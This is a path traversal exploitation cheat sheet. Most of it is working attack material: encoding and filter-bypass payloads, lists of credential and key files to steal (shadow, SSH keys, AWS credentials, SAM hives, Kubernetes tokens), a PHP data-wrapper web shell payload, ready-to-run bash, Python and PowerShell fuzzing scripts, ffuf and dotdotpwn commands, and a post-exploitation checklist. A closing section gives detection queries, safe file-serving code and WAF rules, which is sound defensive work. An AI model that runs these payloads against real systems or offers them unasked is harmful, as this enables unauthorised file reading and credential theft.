# Path Traversal - Complete Cheat Sheet

**Comprehensive reference for path traversal exploitation, bypass techniques, and payloads.**

---

## Table of Contents

- [Quick Payloads](#quick-payloads)
- [Encoding Techniques](#encoding-techniques)
- [Bypass Methods](#bypass-methods)
- [Target Files](#target-files)
- [Platform-Specific Attacks](#platform-specific-attacks)
- [Automation Scripts](#automation-scripts)
- [Detection & Prevention](#detection--prevention)

---

## Quick Payloads

### Basic Traversal

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
```

### Common Depths by Platform

```
Linux (typical web app):     ../../../etc/passwd
Windows (IIS default):        ..\..\..\..\windows\win.ini
Docker container:             ../../../../etc/passwd
Shared hosting:              ../../../../../etc/passwd
```

### Quick Test Payloads

```bash
# Linux
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# Windows
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini

# Universal (works on both)
../../../etc/passwd
..\..\..\windows\win.ini
```

---

## Encoding Techniques

### URL Encoding

#### Single Encoding

| Character | Encoded | Description |
|-----------|---------|-------------|
| `/` | `%2f` | Forward slash |
| `\` | `%5c` | Backslash |
| `.` | `%2e` | Period/dot |
| `%` | `%25` | Percent sign |

**Examples:**
```
../../../etc/passwd
→ ..%2f..%2f..%2fetc%2fpasswd

..\..\..\windows\win.ini
→ ..%5c..%5c..%5cwindows%5cwin.ini
```

#### Double URL Encoding

| Character | Single | Double | Triple |
|-----------|--------|--------|--------|
| `/` | `%2f` | `%252f` | `%25252f` |
| `\` | `%5c` | `%255c` | `%25255c` |
| `.` | `%2e` | `%252e` | `%25252e` |

**Examples:**
```
# Double encoding (most common)
..%252f..%252f..%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Triple encoding (rare)
%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd
```

### Unicode Encoding

#### Full-Width Characters

```
%uff0e = .  (full-width period)
%u2215 = /  (division slash)
%u2216 = \  (set minus)

# Example
%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
```

#### UTF-8 Encoding

```
%c0%ae = .  (overlong encoding)
%c0%af = /  (overlong encoding)
%c1%9c = \  (overlong encoding)

# Example
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
```

#### Overlong UTF-8 Sequences

```
# 2-byte overlong
. = %c0%ae
/ = %c0%af

# 3-byte overlong
. = %e0%80%ae
/ = %e0%80%af

# 4-byte overlong (rare)
. = %f0%80%80%ae
/ = %f0%80%80%af
```

### 16-bit Unicode

```
%u002e = .
%u002f = /
%u005c = \

# Example
%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd
```

---

## Bypass Methods

### 1. Nested Sequences (Non-Recursive Filtering)

**Technique:** Double the traversal sequences so single-pass removal leaves functional payload.

```
# Basic nesting
....//
..././
....\/

# Full payloads
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/windows/win.ini

# Why it works:
....// → remove ../ → ../
     ^^ filter removes this ^^
  ^^ this remains ^^
```

**Variations:**
```
...//...//...//etc/passwd
....\//....\//....\//etc/passwd
..../..../..../etc/passwd
.....////.....////.....////etc/passwd
```

### 2. Absolute Path Bypass

**Technique:** Use absolute paths when relative traversal is blocked.

```
# Linux/Unix
/etc/passwd
/etc/shadow
/proc/self/environ
/var/www/html/.env

# Windows
C:\windows\win.ini
C:\inetpub\wwwroot\web.config
D:\files\sensitive.txt

# Mixed (some systems)
/c:/windows/win.ini
```

### 3. Null Byte Injection

**Technique:** Terminate string parsing before extension validation.

```
# Basic null byte
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg

# Double-encoded null byte
../../../../etc/passwd%2500.png

# Multiple null bytes
../../../../etc/passwd%00%00.png

# Null byte with path
/var/www/images/../../../../etc/passwd%00.png
```

**Platform Compatibility:**
```
PHP < 5.3.4:           ✅ Vulnerable
PHP >= 5.3.4:          ⚠️  Partially patched
Python 2.x:            ⚠️  Depends on API
Python 3.x:            ❌ Raises error
Java:                  ❌ Not vulnerable
Node.js:               ❌ Not vulnerable
C/C++ (file APIs):     ✅ Vulnerable
```

### 4. URL Encoding Bypass

```
# Single encoding
..%2f..%2f..%2fetc/passwd

# Double encoding (bypass URL-decode filters)
..%252f..%252f..%252fetc/passwd

# Mixed encoding
..%2f..%252f../etc/passwd

# Full encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double full encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 5. Path Prefix Bypass

**Technique:** Include required prefix, then traverse out.

```
# Pattern: [REQUIRED_PREFIX] + [TRAVERSAL] + [TARGET]

/var/www/images/../../../etc/passwd
/opt/app/static/../../../../etc/passwd
/home/user/uploads/../../../../../../../etc/passwd

# Windows
C:\inetpub\wwwroot\images\..\..\..\..\windows\win.ini
```

### 6. Mixed Separators

```
# Forward and backslash
..\/..\/..\/etc/passwd
..\/..\/..\windows\win.ini

# Nginx/Tomcat bypass
..;/..;/..;/etc/passwd

# Double separators
....////....////....////etc/passwd
...\\\...\\\...\\\windows\win.ini
```

### 7. Case Sensitivity Bypass

**Windows (case-insensitive):**
```
..\Windows\Win.ini
..\WINDOWS\WIN.INI
..\windows\win.ini
..\WiNdOwS\wIn.InI
```

### 8. UNC Path Injection (Windows)

```
# Access via network share
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\win.ini

# Drive letter alternatives
\\?\C:\windows\win.ini
\\.\C:\windows\win.ini
```

### 9. Wildcard Bypass

```
# Using wildcards if shell execution involved
/etc/pass*
/etc/passwd?
/etc/[p]asswd
```

### 10. Invalid Character Bypass

```
# Extra dots
..........//////etc/passwd
...../...../...../etc/passwd

# Random invalid characters (might bypass regex)
../!../!../etc/passwd
../.+../.+../etc/passwd
```

---

## Target Files

### Linux/Unix Critical Files

#### Authentication & Users
```
/etc/passwd                    # User accounts (world-readable)
/etc/shadow                    # Password hashes (requires root)
/etc/group                     # Group information
/etc/sudoers                   # Sudo configuration
/etc/security/opasswd          # Old passwords
/root/.ssh/id_rsa             # Root SSH private key
/root/.ssh/authorized_keys    # Root SSH authorized keys
/home/[user]/.ssh/id_rsa      # User SSH private key
/home/[user]/.ssh/authorized_keys
```

#### System Information
```
/etc/hostname                  # System hostname
/etc/hosts                     # DNS hosts file
/etc/resolv.conf              # DNS resolver configuration
/etc/network/interfaces       # Network configuration
/proc/version                 # Kernel version
/proc/self/environ            # Process environment variables
/proc/self/cmdline            # Process command line
/proc/self/status             # Process status
/proc/self/fd/[0-9]           # File descriptors
/proc/net/tcp                 # TCP connections
/proc/net/udp                 # UDP connections
/proc/net/arp                 # ARP table
```

#### Application Configuration
```
/var/www/html/.env            # Laravel/Node environment
/var/www/.env                 # Alternative location
/etc/apache2/apache2.conf     # Apache configuration
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf         # Nginx configuration
/etc/nginx/sites-enabled/default
/etc/php/[version]/apache2/php.ini  # PHP configuration
/usr/local/etc/php.ini        # Alternative PHP config
```

#### Database Configuration
```
/etc/mysql/my.cnf             # MySQL configuration
/var/lib/mysql/my.cnf         # Alternative MySQL config
/etc/postgresql/[version]/main/postgresql.conf
/var/lib/pgsql/data/postgresql.conf
```

#### Application Files
```
/var/www/html/config.php      # Common config location
/var/www/html/wp-config.php   # WordPress
/var/www/html/configuration.php  # Joomla
/var/www/html/sites/default/settings.php  # Drupal
/var/www/html/.git/config     # Git repository config
/var/www/html/.git/HEAD       # Git HEAD
/var/log/apache2/access.log   # Apache access logs
/var/log/apache2/error.log    # Apache error logs
/var/log/nginx/access.log     # Nginx access logs
/var/log/nginx/error.log      # Nginx error logs
```

#### Cloud & Container
```
/run/secrets/kubernetes.io/serviceaccount/token  # K8s token
/run/secrets/kubernetes.io/serviceaccount/namespace
/proc/self/cgroup             # Container detection
/proc/1/environ               # Init process environment
/.dockerenv                   # Docker environment marker
```

#### Sensitive Data
```
/root/.bash_history           # Root command history
/home/[user]/.bash_history    # User command history
/root/.mysql_history          # MySQL command history
/root/.aws/credentials        # AWS credentials
/root/.aws/config             # AWS configuration
/home/[user]/.aws/credentials
/home/[user]/.ssh/known_hosts # SSH known hosts
```

### Windows Target Files

#### System Information
```
C:\windows\win.ini            # Windows initialization (PoC)
C:\windows\system32\drivers\etc\hosts  # Hosts file
C:\windows\system32\license.rtf        # License (PoC)
C:\windows\system.ini         # System configuration
```

#### Authentication & Credentials
```
C:\windows\repair\sam         # Backup SAM database
C:\windows\repair\system      # Backup system hive
C:\windows\system32\config\sam        # SAM database
C:\windows\system32\config\system     # System hive
C:\windows\system32\config\security   # Security hive
C:\Users\[user]\NTUSER.DAT    # User registry hive
```

#### IIS Configuration
```
C:\inetpub\wwwroot\web.config # IIS application config
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\inetsrv\metabase.xml
C:\inetpub\logs\LogFiles\W3SVC1\  # IIS logs
```

#### Application Configuration
```
C:\Program Files\[App]\config.xml
C:\Program Files (x86)\[App]\config.xml
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\wamp\bin\apache\apache[version]\conf\httpd.conf
```

#### Sensitive Files
```
C:\Users\[user]\.aws\credentials
C:\Users\[user]\.ssh\id_rsa
C:\Users\Administrator\.ssh\id_rsa
C:\pagefile.sys               # Windows page file
C:\hiberfil.sys               # Hibernation file
```

### MacOS Target Files

```
/etc/passwd                   # User accounts
/etc/master.passwd           # Password hashes (requires root)
/private/etc/hosts           # Hosts file
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
/Users/[user]/.ssh/id_rsa    # SSH private key
/Users/[user]/.bash_history  # Command history
/Users/[user]/.aws/credentials
```

---

## Platform-Specific Attacks

### ASP.NET Cookieless Session Bypass

**Technique:** Inject traversal within session path.

```
# Normal: /app/(S(session_id))/page.aspx
# Attack: /app/(S(x))/admin/(S(x))/restricted.aspx

/(S(x))/admin/(S(x))/web.config
/(A(x))/admin/(A(x))/sensitive.aspx
/(F(x))/../../web.config
```

### Java Servlet Path Manipulation

```
# Spring Framework
/static/%255c%255c..%255c/..%255c/windows/win.ini

# Tomcat
/..;/..;/..;/etc/passwd
```

### Nginx/Tomcat Path Parsing Inconsistency

**Technique:** Nginx treats `..;/` as directory, Tomcat interprets as traversal.

```
/services/pluginscript/..;/..;/getFavicon
/api/v1/..;/..;/admin/users
```

### IIS Short Name Enumeration

```
# Access 8.3 short names
/bin::$INDEX_ALLOCATION/
/admin~1/
/config~1.php

# Tools
- IIS-ShortName-Scanner
- shortscan
```

### PHP Include Wrappers

```
# File wrapper
?file=file:///etc/passwd

# PHP wrapper
?file=php://filter/convert.base64-encode/resource=/etc/passwd

# Data wrapper
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (if enabled)
?file=expect://whoami
```

### Node.js Path Normalization

```
# Path.normalize() bypass
/static/..%2F..%2F..%2Fetc/passwd

# Path.join() issues
/files/....////....////etc/passwd
```

---

## Automation Scripts

### Bash Script

```bash
#!/bin/bash

URL="https://target.com/image?filename="
TARGET="/etc/passwd"

payloads=(
    "../../../${TARGET}"
    "../../../../${TARGET}"
    "../../../../../${TARGET}"
    "/${TARGET}"
    "....//....//....//....//..../${TARGET}"
    "..%2f..%2f..%2f${TARGET}"
    "..%252f..%252f..%252f${TARGET}"
    "/var/www/images/../../../${TARGET}"
    "../../../../${TARGET}%00.png"
)

for payload in "${payloads[@]}"; do
    echo "[*] Testing: $payload"
    response=$(curl -s "${URL}${payload}")

    if echo "$response" | grep -q "root:x"; then
        echo "[+] VULNERABLE with payload: $payload"
        echo "$response" | head -5
        break
    fi
done
```

### Python Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def test_path_traversal(url, param="filename"):
    target_file = "etc/passwd"
    success_indicator = "root:x"

    payloads = [
        f"../../../{target_file}",
        f"../../../../{target_file}",
        f"../../../../../{target_file}",
        f"/{target_file}",
        f"....//....//....//....//..../{target_file}",
        f"..%2f..%2f..%2f{target_file}",
        f"..%252f..%252f..%252f{target_file}",
        f"/var/www/images/../../../{target_file}",
        f"../../../../{target_file}%00.png",
    ]

    for payload in payloads:
        print(f"[*] Testing: {payload}")

        params = {param: payload}
        try:
            response = requests.get(url, params=params, timeout=10)

            if success_indicator in response.text:
                print(f"[+] VULNERABLE!")
                print(f"[+] Payload: {payload}")
                print(f"[+] Response preview:\n{response.text[:200]}")
                return True

        except Exception as e:
            print(f"[-] Error: {e}")

    print("[-] Not vulnerable or all payloads blocked")
    return False

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} https://target.com/image")
        sys.exit(1)

    url = sys.argv[1]
    test_path_traversal(url)
```

### PowerShell Script

```powershell
$URL = "https://target.com/image"
$Param = "filename"
$Target = "etc/passwd"

$Payloads = @(
    "../../../$Target",
    "../../../../$Target",
    "../../../../../$Target",
    "/$Target",
    "....//....//....//....//..../$Target",
    "..%2f..%2f..%2f$Target",
    "..%252f..%252f..%252f$Target",
    "/var/www/images/../../../$Target",
    "../../../../$Target%00.png"
)

foreach ($Payload in $Payloads) {
    Write-Host "[*] Testing: $Payload" -ForegroundColor Yellow

    $URI = "$URL?$Param=$Payload"

    try {
        $Response = Invoke-WebRequest -Uri $URI -UseBasicParsing

        if ($Response.Content -match "root:x") {
            Write-Host "[+] VULNERABLE!" -ForegroundColor Green
            Write-Host "[+] Payload: $Payload"
            Write-Host $Response.Content.Substring(0, [Math]::Min(200, $Response.Content.Length))
            break
        }
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
    }
}
```

### Burp Suite Intruder Payloads

```
# Payload position:
GET /image?filename=§PAYLOAD§ HTTP/2

# Payload list:
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
/etc/passwd
/etc/shadow
/etc/hosts
....//....//....//etc/passwd
..././..././..././etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
/var/www/images/../../../etc/passwd
/opt/app/static/../../../../etc/passwd
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg
..;/..;/..;/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd

# Grep - Match:
root:x:0:0:root
daemon:x:
bin:x:
```

### FFuf (Fast Fuzzer)

```bash
# Basic fuzzing
ffuf -u "https://target.com/image?filename=FUZZ" \
     -w path-traversal-payloads.txt \
     -mr "root:x" \
     -c

# With custom wordlist
cat > payloads.txt << EOF
../../../etc/passwd
/etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
EOF

ffuf -u "https://target.com/FUZZ" \
     -w payloads.txt \
     -mc 200 \
     -ms 1000 \
     -c

# Multiple parameter fuzzing
ffuf -u "https://target.com/FUZZ1?file=FUZZ2" \
     -w endpoints.txt:FUZZ1 \
     -w payloads.txt:FUZZ2 \
     -mr "root:x"
```

### dotdotpwn

```bash
# HTTP module
perl dotdotpwn.pl -m http -h target.com -x 443 -f /etc/passwd -k "root:" -d 8 -t 300

# HTTPS with custom port
perl dotdotpwn.pl -m http-url -u "https://target.com/image?file=TRAVERSAL" \
                  -f /etc/passwd -k "root:" -d 8

# With authentication
perl dotdotpwn.pl -m http -h target.com -O "Authorization: Bearer TOKEN" \
                  -f /etc/passwd -d 8

# FTP module
perl dotdotpwn.pl -m ftp -h target.com -U username -P password \
                  -f /etc/passwd -d 8

# Options:
# -m: Module (http, http-url, ftp, tftp, payload, stdout)
# -h: Host
# -x: Port
# -f: Target file
# -k: Keyword to identify success
# -d: Depth (number of ../ to try)
# -t: Time in milliseconds between requests
# -O: HTTP header options
# -b: Break after first vulnerability found
# -s: Use SSL
```

---

## Detection & Prevention

### Detection Methods

#### Log Analysis

**Apache/Nginx Access Logs:**
```bash
# Detect path traversal attempts
grep -E '\.\./|\.\.\%2f|\.\.\%5c|%2e%2e%2f' /var/log/nginx/access.log

# Common patterns
grep -E '(\.\.\/|\.\.\\|%2e%2e%2f|%252e%252e%252f)' access.log

# Multiple attempts from same IP
awk '$7 ~ /\.\./ {print $1}' access.log | sort | uniq -c | sort -rn
```

**Web Application Firewall Logs:**
```bash
# ModSecurity audit log
grep "Path Traversal" /var/log/modsec_audit.log

# Extract blocked requests
grep -B 5 "id:950001" /var/log/modsec_audit.log
```

#### SIEM Queries

**Splunk:**
```spl
index=web_logs
(uri="*../*" OR uri="*..\\*" OR uri="*%2e%2e%2f*" OR uri="*%252e%252e%252f*")
| stats count by src_ip, uri
| where count > 5
| sort -count
```

**ELK/Elasticsearch:**
```json
GET /logs/_search
{
  "query": {
    "bool": {
      "should": [
        {"wildcard": {"request.uri": "*../*"}},
        {"wildcard": {"request.uri": "*%2e%2e%2f*"}},
        {"wildcard": {"request.uri": "*%252e%252e%252f*"}}
      ]
    }
  },
  "aggs": {
    "by_ip": {
      "terms": {"field": "client.ip"}
    }
  }
}
```

### Prevention Code Examples

#### Python (Flask)

```python
from flask import Flask, request, send_file, abort
import os

app = Flask(__name__)
BASE_DIR = '/var/www/files/'

@app.route('/files/<file_id>')
def get_file(file_id):
    # Use whitelist (best practice)
    allowed_files = {
        '1': 'document1.pdf',
        '2': 'document2.pdf',
        '3': 'image1.png'
    }

    filename = allowed_files.get(file_id)
    if not filename:
        abort(403)

    # Build and validate path
    file_path = os.path.join(BASE_DIR, filename)
    real_path = os.path.realpath(file_path)
    real_base = os.path.realpath(BASE_DIR)

    # Verify path is within base directory
    if not real_path.startswith(real_base):
        abort(403)

    # Verify file exists
    if not os.path.isfile(real_path):
        abort(404)

    return send_file(real_path)
```

#### Node.js (Express)

```javascript
const express = require('express');
const path = require('path');
const fs = require('fs').promises;

const app = express();
const BASE_DIR = '/var/www/files/';

app.get('/files/:fileId', async (req, res) => {
    // Use whitelist
    const allowedFiles = {
        '1': 'document1.pdf',
        '2': 'document2.pdf',
        '3': 'image1.png'
    };

    const filename = allowedFiles[req.params.fileId];
    if (!filename) {
        return res.status(403).send('Access denied');
    }

    // Build and validate path
    const filePath = path.join(BASE_DIR, filename);
    const realPath = await fs.realpath(filePath).catch(() => null);
    const realBase = await fs.realpath(BASE_DIR);

    // Verify path is within base directory
    if (!realPath || !realPath.startsWith(realBase)) {
        return res.status(403).send('Access denied');
    }

    // Send file
    res.sendFile(realPath);
});
```

#### Java (Spring Boot)

```java
import org.springframework.web.bind.annotation.*;
import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;
import org.springframework.http.ResponseEntity;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;

@RestController
public class FileController {

    private static final String BASE_DIR = "/var/www/files/";
    private static final Map<String, String> ALLOWED_FILES = Map.of(
        "1", "document1.pdf",
        "2", "document2.pdf",
        "3", "image1.png"
    );

    @GetMapping("/files/{fileId}")
    public ResponseEntity<Resource> getFile(@PathVariable String fileId) {
        // Use whitelist
        String filename = ALLOWED_FILES.get(fileId);
        if (filename == null) {
            return ResponseEntity.status(403).build();
        }

        try {
            // Build and validate path
            Path filePath = Paths.get(BASE_DIR, filename);
            Path normalizedPath = filePath.normalize();
            Path basePath = Paths.get(BASE_DIR).normalize();

            // Verify path is within base directory
            if (!normalizedPath.startsWith(basePath)) {
                return ResponseEntity.status(403).build();
            }

            // Load resource
            Resource resource = new UrlResource(normalizedPath.toUri());

            if (!resource.exists()) {
                return ResponseEntity.notFound().build();
            }

            return ResponseEntity.ok()
                .body(resource);

        } catch (Exception e) {
            return ResponseEntity.status(500).build();
        }
    }
}
```

### WAF Rules

#### ModSecurity

```apache
# Basic path traversal detection
SecRule REQUEST_URI|ARGS|REQUEST_BODY "@rx (?:\\.\\./|\\.\\.\\\\)" \
    "id:950001,phase:2,deny,status:403,msg:'Path Traversal Attack'"

# URL-encoded traversal
SecRule REQUEST_URI|ARGS "@rx %(?:2e|25(?:2e|5c)|c0%ae)" \
    "id:950002,phase:2,deny,status:403,msg:'Encoded Path Traversal'"

# Absolute path access
SecRule ARGS "@rx ^(?:/etc/|/proc/|/sys/|C:\\\\)" \
    "id:950003,phase:2,deny,status:403,msg:'Absolute Path Access'"

# Null byte injection
SecRule REQUEST_URI|ARGS "@rx %00" \
    "id:950004,phase:2,deny,status:403,msg:'Null Byte Injection'"
```

#### Nginx

```nginx
# Block common path traversal patterns
location / {
    if ($request_uri ~* "(\.\./)|(\.\.\\)") {
        return 403;
    }

    if ($request_uri ~* "%2e%2e%2f|%2e%2e%5c") {
        return 403;
    }

    if ($request_uri ~* "^/etc/|^/proc/|^/sys/") {
        return 403;
    }

    # Your normal configuration
}
```

---

## Testing Checklist

### Manual Testing

- [ ] Test basic traversal: `../../../etc/passwd`
- [ ] Test absolute paths: `/etc/passwd`
- [ ] Test URL encoding: `..%2f..%2f..%2fetc/passwd`
- [ ] Test double encoding: `..%252f..%252f..%252fetc/passwd`
- [ ] Test nested sequences: `....//....//....//etc/passwd`
- [ ] Test null byte: `../../../../etc/passwd%00.png`
- [ ] Test with prefix: `/var/www/images/../../../etc/passwd`
- [ ] Test different depths: 1-10 levels of `../`
- [ ] Test Windows paths: `..\..\..\windows\win.ini`
- [ ] Test mixed separators: `..\/..\/..\/etc/passwd`

### Automated Testing

- [ ] Run Burp Suite Scanner
- [ ] Use dotdotpwn
- [ ] Use ffuf with path traversal wordlist
- [ ] Test with OWASP ZAP
- [ ] Use custom scripts for bulk testing

### Post-Exploitation

- [ ] Enumerate accessible files
- [ ] Extract credentials from configuration files
- [ ] Read application source code
- [ ] Access database configuration
- [ ] Read SSH keys
- [ ] Access cloud metadata (if applicable)
- [ ] Document all findings with evidence

---

## Quick Command Reference

```bash
# cURL basic test
curl "https://target.com/file?name=../../../etc/passwd"

# cURL with encoding
curl "https://target.com/file?name=..%252f..%252f..%252fetc/passwd"

# Python one-liner
python3 -c "import requests; print('[+] Vulnerable' if 'root:x' in requests.get('https://target.com/file?name=../../../etc/passwd').text else '[-] Not vulnerable')"

# Bash loop through depths
for i in {1..10}; do
    payload=$(printf '../%.0s' $(seq 1 $i))
    echo "[*] Testing depth $i: ${payload}etc/passwd"
    curl -s "https://target.com/file?name=${payload}etc/passwd" | grep -q "root:x" && echo "[+] VULNERABLE at depth $i" && break
done

# ffuf fuzzing
ffuf -u "https://target.com/FUZZ" -w path-traversal.txt -mr "root:x"
```

---

**Cheat Sheet Version:** 1.0
**Last Updated:** January 2026
**Total Payloads:** 100+
